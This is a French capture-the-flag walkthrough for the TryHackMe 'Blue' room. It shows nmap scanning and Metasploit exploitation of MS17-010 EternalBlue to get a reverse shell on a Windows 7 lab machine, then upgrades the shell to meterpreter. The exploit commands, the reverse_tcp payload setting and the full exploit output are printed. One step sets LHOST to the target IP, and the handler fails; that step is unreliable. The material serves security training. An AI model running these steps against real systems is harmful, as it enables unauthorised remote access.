# **[BLUE](https://tryhackme.com/r/room/blue)**

Outils utilisés: [NMAP](https://nmap.org/)

## TACHE 1 - Recon

### Question 1

<pre>
How many ports are open with a port number under 1000?
Combien de ports sont ouverts avec un numéro de port inférieur à 1000 ?
</pre>

<br>

> [!TIP]
> Near the top of the nmap output: PORT STATE SERVICE
> <br>Dans les premières lignes de la sortie de nmap : PORT STATE SERVICE

<br>Pour cet exercice, pas de grandes difficultés, il suffit simplement de lancer `nmap` comme mentionné:

```bash
nmap -Pn <IP_CIBLE>
```

<br>

> [!IMPORTANT]
> <b>°</b>

<br>

> [!WARNING]
> Je le rappelle, l'IP de la cible change à chaque démarrage de la machine, remplacez `<IP_CIBLE>` par la votre !

<br>

### Question 2

<pre>
What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
À quoi cette machine est-elle vulnérable ? (Réponse sous la forme : ms??- ????, ex : ms08-067)
</pre>

<br>

> [!TIP]
> Revealed by the ShadowBrokers, exploits an issue within SMBv1
> <br>Révélée par les ShadowBrokers, elle exploite un problème au sein de SMBv1.

<br>Pour répondre à cette question, nous allons utiliser le flag `--script` et le mot clé `vuln`, ce qui va lister les vulnérabiltés sur cette machine.

```bash
nmap --script vuln <IP_CIBLE>
```

<br>

<pre>
Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-12 08:37 BST
Nmap scan report for ip-&lt;IP_CIBLE&gt;.eu-west-1.compute.internal (&lt;IP_CIBLE&gt;)
Host is up (0.00059s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown: 
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
MAC Address: 02:A2:22:23:B8:B7 (Unknown)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds
</pre>

<br>Il y a plusieurs vulnérabilités, pour savoir laquelle est notre réponse, il faut se souvenir de l'indice qui porte sur un exploit de `SMBv1`.

<br>

> [!IMPORTANT]
> <b>ms°°-°°°</b>

---

## TACHE 2 - GAIN ACCESS

Pour cette exercice, il va falloir lancer `Metasploit`.
<br>Tapez la commande:

```bash
msfconsole
```

<br>

> [!NOTE]
> Il est possible que la base de données de `Metasploit` ne soit pas à jour au moment du lancement, pour lancer la mise à jour, tapez: `msfupdate`.

<br>

### Question 1

<pre>
Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
Trouvez le code d'exploitation que nous allons exécuter sur la machine. Quel est le chemin complet du code ? (Ex : exploit/........)
</pre>

<br>

> [!TIP]
> search ms??
> <br>Chercher ms??

<br>Une fois que `Metasploit` est à jour, nous pouvons chercher l'exploit de la vulnérabilité trouvée dans l'exercice précédent.

<br>

```bash
search ms°°-°°°
```

Bien évidement, remplacez `ms°°` par la réponse de toute à l'heure.

<br>

<pre>
[...]

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
</pre>

<br>Vous pouvez voir plusieurs failles, la faille qui nous intéresse est celle qui concerne  le nom de la room: `Blue`

<br>

> [!IMPORTANT]
> <b>exploit/°°°°°°°/°°°/°°°°°°°°°°°°°°°°°°°°</b>

<br>

### Question 2

<pre>
Show options and set the one required value. What is the name of this value? (All caps for submission)
Afficher les options et définir la seule valeur requise. Quel est le nom de cette valeur ? (Tout en majuscules pour la soumission)
</pre>

<br>

> [!TIP]
> Command: show options
> <br>Commande: show options

<br>Sélectionnez l'exploit:

```bash
use °
```
Remplacez le `°` par le numéro de la faille de la réponse précédente.

<br>Ensuite, tapez:

```bash
show options
```

<pre>
Module options (exploit/°°°°°°°/°°°/°°°°°°°°°°°°°°°°°°°°):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                             sing-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.185.18     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
</pre>

<br>Nous pouvons voir qu'il n'y a qu'une seule option qui requiert une valeur de notre part:

<br>

> [!IMPORTANT]
> <b>°°°°°°</b>

<br>

### Mise en pratique

Avant de passer à l'étape suivante, il faut définir la cible:

```bash
set °°°°°° <IP_CIBLE>
```
Remplacez `°°°` par la réponse précédente.

<br>

<pre>
Normalement, il est possible d'exécuter cet exploit tel quel, cependant, pour le bien de l'apprentissage, vous devriez
faire une chose de plus avant d'exploiter la cible. Entrez la commande suivante et appuyez sur Entrée.
<b>NOTE</b>: Toujours sous "Metasploit".
</pre>

```bash
set payload windows/x64/shell/reverse_tcp
```
<pre>
payload => windows/x64/shell/reverse_tcp
</pre>

<pre>
With that done, run the exploit!
Une fois cela fait, lancez l'exploit !
</pre>

<br>Ensuite, tapez:

```bash
run
```
<pre>
[*] Started reverse TCP handler on &lt;IP_ATTACK&gt;:4444 
[*] &lt;IP_CIBLE&gt;:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] &lt;IP_CIBLE&gt;:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] &lt;IP_CIBLE&gt;:445     - Scanned 1 of 1 hosts (100% complete)
[+] &lt;IP_CIBLE&gt;:445 - The target is vulnerable.
[*] &lt;IP_CIBLE&gt;:445 - Connecting to target for exploitation.
[+] &lt;IP_CIBLE&gt;:445 - Connection established for exploitation.
[+] &lt;IP_CIBLE&gt;:445 - Target OS selected valid for OS indicated by SMB reply
[*] &lt;IP_CIBLE&gt;:445 - CORE raw buffer dump (42 bytes)
[*] &lt;IP_CIBLE&gt;:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] &lt;IP_CIBLE&gt;:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] &lt;IP_CIBLE&gt;:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] &lt;IP_CIBLE&gt;:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] &lt;IP_CIBLE&gt;:445 - Trying exploit with 12 Groom Allocations.
[*] &lt;IP_CIBLE&gt;:445 - Sending all but last fragment of exploit packet
[*] &lt;IP_CIBLE&gt;:445 - Starting non-paged pool grooming
[+] &lt;IP_CIBLE&gt;:445 - Sending SMBv2 buffers
[+] &lt;IP_CIBLE&gt;:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] &lt;IP_CIBLE&gt;:445 - Sending final SMBv2 buffers.
[*] &lt;IP_CIBLE&gt;:445 - Sending last fragment of exploit packet!
[*] &lt;IP_CIBLE&gt;:445 - Receiving response from exploit packet
[+] &lt;IP_CIBLE&gt;:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] &lt;IP_CIBLE&gt;:445 - Sending egg to corrupted connection.
[*] &lt;IP_CIBLE&gt;:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to &lt;IP_CIBLE&gt;
[*] Command shell session 1 opened (&lt;IP_ATTACK&gt;:4444 -> &lt;IP_CIBLE&gt;:49297) at 2024-09-12 09:56:27 +0100
[+] &lt;IP_CIBLE&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] &lt;IP_CIBLE&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] &lt;IP_CIBLE&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
</pre>

Nous voyons que l'exploit a fonctionné et que nous avons accès à `DOS` de `Windows 7 Pro SP1`.
<br>Gardez-le dans un coin, nous en aurons besoin plus tard.

---

## TACHE 3 - ESCALATE

Dans cet exercice, nous allons utiliser l'escalade de privilèges.

### Question 1

<pre>
If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter
shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

Si vous ne l'avez pas encore fait, mettez en arrière-plan le shell précédemment acquis (CTRL + Z). Recherchez en ligne comment
convertir un shell en shell meterpreter dans metasploit. Quel est le nom du module post que nous allons utiliser ? (Chemin
exact, similaire à l'exploit que nous avons sélectionné précédemment) 
</pre>

<br>

> [!TIP]
> Google this: shell_to_meterpreter
> <br>Cherchez sur Google : shell_to_meterpreter

<br>Une fois le `DOS` mis en arrière-plan, vous revenez sur `Metasploit`, tapez:

```bash
search shell_to_meterpreter
```

<br>Bon ben là c'est pas compliqué, il n'y a qu'une seule réponse...

<br>

> [!IMPORTANT]
> <b>°°°°/°°°°°/°°°°°°/°°°°°°°°°°°°°°°°°°°°</b>

<br>

### Question 2

<pre>
Select this (use MODULE_PATH). Show options, what option are we required to change?
Sélectionnez ceci (use MODULE_PATH). Afficher les options, quelle option devons-nous modifier ?
</pre>

<br>Comme pour l'exercice précédent, selectionnez l'exploit:

```bash
use 0
```

Puis, tapez:

```bash
options
```
<pre>
[...]

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
</pre>

<br>Ici encore, nous pouvons voir qu'une seule option requiert une valeur de notre part:

<br>

> [!IMPORTANT]
> <b>°°°°°°°</b>

<br>

### Mise en pratique

<pre>
Set the required option, you may need to list all of the sessions to find your target here.
Définissez l'option requise, il se peut que vous deviez lister toutes les sessions pour trouver votre cible ici. 
</pre>

<br>

> [!TIP]
> sessions -l

<br>Tapez:

```bash
sessions -l
```
<pre>
Active sessions
===============

  Id  Name  Type                     Information                                            Connection
  --  ----  ----                     -----------                                            ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601]     &lt;IP_ATTACK&gt;:4444 -> &lt;IP_CIBLE&gt;:49306 (&lt;IP_CIBLE&gt;)     
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                           &lt;IP_ATTACK&gt;:4433 -> &lt;IP_CIBLE&gt;:49337 (&lt;IP_CIBLE&gt;)
</pre>

<br>Tapez:

```bash
set SESSION 1
```
<pre>
SESSION => 1
</pre>

<br>Puis tapez:

```bash
set LHOST <IP_CIBLE>
```
<pre>
LHOST => &lt;IP_CIBLE&gt;
</pre>

<br>

<pre>
Run! If this doesn't work, try completing the exploit from the previous task once more.
Exécutez ! Si cela ne fonctionne pas, essayez à nouveau de réaliser l'exploit de la tâche précédente.
</pre>

<br>

> [!TIP]
> Command: run (or exploit)
> <br>Commande: run (ou exploit)
> <br><br><b>NOTE</b>: Les commmandes `run` et `exploit` font en réalité la même chose.

```bash
run
```
<pre>
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[-] Handler failed to bind to &lt;IP_CIBLE&gt;:4433:-  -
[*] Started reverse TCP handler on 0.0.0.0:4433 
[*] Post module execution completed
</pre>

<br>

Je vous laisse finir l'exercice.

<br>

> [!TIP]
> **FELICITATIONS, VOUS AVEZ TERMINÉ LA ROOM !**
